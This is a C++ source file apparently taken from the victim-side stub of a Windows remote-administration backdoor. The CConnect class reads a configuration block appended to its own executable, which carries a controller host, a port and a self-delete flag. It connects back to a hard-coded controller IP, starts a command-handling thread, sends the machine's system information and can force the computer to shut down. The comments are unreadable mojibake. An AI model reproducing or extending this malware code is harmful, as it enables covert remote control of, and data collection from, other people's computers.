#include "StdAfx.h"
#include "Connect.h"


CConnect::CConnect() {
	m_strDDNSIP = "host.org.com";
	m_strClientIP = "192.168.100.101";
	m_nClientPort = 80;
	m_pNetProcotolThread = NULL;
	m_pDealCMDThread = NULL;
}


CConnect::~CConnect(void)
{
}

void CConnect::StopComputer(UINT uFlags){
	m_systemUtility.ForceExitWindow(uFlags);
}

BOOL CConnect::StartConnect(HWND hwnd) {
	m_hwnd = hwnd;
	BOOL res = TRUE;
	res &= MakeClientConnectInfo();
	res &= InitConnection();
	return res;
}
// �������ȡ�ͻ���������Ϣ
BOOL CConnect::MakeClientConnectInfo()
{
	BOOL bRes = FALSE;
	
	NM_SERVER_FILE_S	nmServerFile;
	int nSize = sizeof(NM_SERVER_FILE_S);
	
	CString strExeFile;			// ���ڱ��浱ǰִ�г���·��
	GetModuleFileName(NULL,strExeFile.GetBufferSetLength(MAX_PATH),MAX_PATH);
	strExeFile.ReleaseBuffer();
	
	CFile fileServer(strExeFile,CFile::modeRead|CFile::shareDenyNone);
	
	fileServer.Seek(- nSize , CFile::end);
	int nReadSize = fileServer.Read(&nmServerFile , sizeof(NM_SERVER_FILE_S));
	fileServer.Close();
	
	bRes = (nReadSize == nSize);
	if(bRes && (nmServerFile.nCheckFlag == 20080818))
	{
		// ���¿ͻ���������Ϣ
		m_strDDNSIP	    = nmServerFile.szClientIP;
		m_nClientPort	= nmServerFile.nClientPort;
		m_bDeleteSelf	= nmServerFile.bDeleteSelf;
	}
	
	return bRes;
}


// ���ӿͻ���
BOOL CConnect::InitConnection()
{
	//SAFE_DELETE(m_pNetProcotolThread);
	if(m_pNetProcotolThread !=NULL) {
		delete(m_pNetProcotolThread);
		m_pNetProcotolThread = NULL;
	}

	m_strClientIP = "192.168.1.106";
	m_nClientPort = 80;
	m_pNetProcotolThread = new CNetProtocolThread(m_hwnd,m_strClientIP,m_nClientPort);
	CheckPointer(m_pNetProcotolThread,FALSE);
	m_pNetProcotolThread->ResumeThread();

	return TRUE;
}

void CConnect::StopConnect() {

	SAFE_DELETE(m_pNetProcotolThread);
	SAFE_DELETE(m_pDealCMDThread)

}

void CConnect::StartWork() {
	
	m_hSocketClient = m_pNetProcotolThread->m_hSocketProtocol;
		
	SAFE_DELETE(m_pDealCMDThread);
	m_pDealCMDThread = new CDealCMDThread(m_hwnd,(int*)this,m_hSocketClient,m_strClientIP);
	m_pDealCMDThread->ResumeThread();
		
	m_pDealCMDThread->Command_SendSystemInfo();
}